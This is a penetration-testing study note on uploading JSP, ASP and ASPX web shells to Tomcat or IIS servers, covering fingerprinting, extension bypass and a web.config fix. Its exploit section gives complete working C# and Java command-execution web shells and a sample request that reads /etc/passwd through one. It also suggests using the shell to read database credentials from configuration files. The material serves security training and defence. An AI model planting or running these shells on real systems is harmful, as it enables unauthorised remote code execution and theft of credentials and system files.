---
tags: [vapt, file-upload, java, dotnet, intermediate]
difficulty: intermediate
module: "22 - File Upload"
topic: "22.13 Uploading Server-Side Scripts (JSP, ASP, ASPX)"
portswigger_labs: ["Remote code execution via web shell upload", "Web shell upload via obfuscated file extension"]
---

# 22.13 — Uploading Server-Side Scripts (JSP, ASP, ASPX)

## What is it?
While PHP is the most notorious language for file upload webshells, enterprise environments frequently run on Java (Tomcat, Spring) or Microsoft .NET (IIS). If an application built on these stacks suffers from an unrestricted file upload vulnerability, an attacker can upload a Server-Side script such as a Java Server Page (`.jsp`, `.jspx`) or an Active Server Page (`.asp`, `.aspx`).

When the server receives an HTTP request pointing to these uploaded files, the application server (like Tomcat or IIS) compiles and executes the code embedded in the file. Because Java and .NET are incredibly powerful, full-featured enterprise frameworks, the resulting Remote Code Execution (RCE) is often highly stable and capable of interacting deeply with the operating system, bypassing certain memory restrictions that might hinder simpler scripting languages.

Think of it like dropping a blueprint into a factory's inbox. If the factory workers (the web server) are instructed to automatically build anything placed in that inbox, dropping a blueprint for a demolition robot (`.jsp` or `.aspx`) will result in the factory destroying itself.

## ASCII Diagram
```text
[Attacker] 
   │ 
   │ 1. Uploads malicious payload: shell.jsp
   ▼
[Tomcat / IIS Web Server]
   │
   │ 2. Saves file to /opt/tomcat/webapps/ROOT/uploads/shell.jsp
   ▼
[File System]
   │
[Attacker] ────── 3. Requests: GET /uploads/shell.jsp?cmd=whoami
   │
[Tomcat Application Server]
   │
   │ 4. Detects .jsp extension
   │ 5. Compiles shell.jsp into a Java Servlet (.class)
   │ 6. Executes the Servlet code (Runtime.getRuntime().exec("whoami"))
   ▼
[Operating System] ─── 7. Returns "tomcat-user" to Attacker
```

## How to Find It
- **Manual steps:**
  1. Profile the target web server using tools like Wappalyzer, or by examining HTTP response headers (`Server: Microsoft-IIS/10.0` or `X-Powered-By: ASP.NET`).
  2. Locate an upload endpoint.
  3. Attempt to upload a benign text file with a `.jsp` or `.aspx` extension.
  4. If the upload is successful, attempt to browse to the file. If you see a compilation error or execution output instead of the raw source code, the server is executing the scripts.

- **Tool commands with flags explained:**
  To quickly fingerprint the server to determine the right payload:
  ```bash
  # Grab HTTP headers to identify IIS or Tomcat
  curl -I https://target.com/
  # Look for "Server: Microsoft-IIS" -> use ASP/ASPX
  # Look for "JSESSIONID" cookie -> use JSP
  ```

## How to Exploit It
- **Step-by-step walkthrough:**
  1. Determine the backend technology (Java = JSP, IIS = ASP/ASPX).
  2. Prepare a minimal webshell for that specific language.
  3. Upload the file, applying extension bypass techniques (e.g., `.ashx`, `.jspx`, `.jws`) if the primary extension is blocked.
  4. Obtain the URL of the uploaded file.
  5. Send HTTP requests with the command parameter to achieve RCE.

- **Actual payloads:**
  **Minimal ASPX Webshell (C#):**
  ```aspx
  <%@ Page Language="C#" %>
  <% 
    string cmd = Request.QueryString["cmd"];
    if (cmd != null) {
        System.Diagnostics.Process p = new System.Diagnostics.Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + cmd;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.UseShellExecute = false;
        p.Start();
        Response.Write("<pre>" + Server.HtmlEncode(p.StandardOutput.ReadToEnd()) + "</pre>");
    }
  %>
  ```

  **Minimal JSP Webshell (Java):**
  ```jsp
  <%@ page import="java.io.*" %>
  <%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        out.println("<pre>");
        while ((line = in.readLine()) != null) {
            out.println(line);
        }
        out.println("</pre>");
    }
  %>
  ```

- **Real HTTP request/response examples:**
  **Execution Request (JSP):**
  ```http
  GET /uploads/shell.jsp?cmd=cat+/etc/passwd HTTP/1.1
  Host: target.com

  HTTP/1.1 200 OK
  
  <pre>
  root:x:0:0:root:/root:/bin/bash
  tomcat:x:999:999::/opt/tomcat:/bin/false
  </pre>
  ```

## Real-World Example
During a red team engagement against a financial institution, attackers found an HR portal built on ASP.NET. The portal allowed users to upload resumes but validated the `Content-Type` to ensure it was `application/pdf`. The attackers intercepted the request, changed the filename to `resume.aspx`, and kept the `Content-Type: application/pdf`. The IIS server blindly saved the file. When the attackers browsed to `/resumes/resume.aspx`, the IIS compiler kicked in, compiled the C# code, and granted the attackers a reverse shell as the `IIS_IUSRS` service account.

## How to Fix It
- **Developer remediation:**
  Servers like Tomcat and IIS will happily compile any script they find in a web-accessible directory if the extension matches. To fix this, you must store uploaded files **outside** the web root directory so they cannot be directly routed to via an HTTP request. If they must be in the web root, configure the application server (e.g., via `web.config` in IIS) to explicitly strip execution handlers from the upload directory.

- **Code snippet:**
  **IIS `web.config` (Disable Execution in Uploads Folder):**
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <configuration>
      <system.webServer>
          <handlers>
              <!-- Remove the handler that processes ASPX scripts -->
              <remove name="PageHandlerFactory-Integrated" />
              <remove name="PageHandlerFactory-Integrated-4.0" />
              <remove name="PageHandlerFactory-ISAPI-2.0" />
              <remove name="PageHandlerFactory-ISAPI-4.0" />
              <!-- Clear all script execution -->
              <access sslFlags="None" executePermissions="None" />
          </handlers>
      </system.webServer>
  </configuration>
  ```

## Chaining Opportunities
- This vuln + [[Missing File Permissions / Sudo Privileges]] → Application servers like Tomcat often run under highly privileged accounts (sometimes even `root` or `SYSTEM` if misconfigured). A JSP webshell on a misconfigured Tomcat server instantly yields full OS takeover.
- This vuln + [[10 - Chaining Playbook (Database Credentials)]] → Java applications usually store database credentials in `application.properties`, `context.xml`, or `web.xml`. Use the JSP webshell to read these files and access the backend databases.

## Related Notes
- [[02 - Unrestricted File Upload — Webshell Upload]]
- [[04 - Extension Bypass (.php5, .phtml, .phar, .shtml)]]
- [[15 - Defense — Extension Allowlists, Content Validation, Separate Storage]]
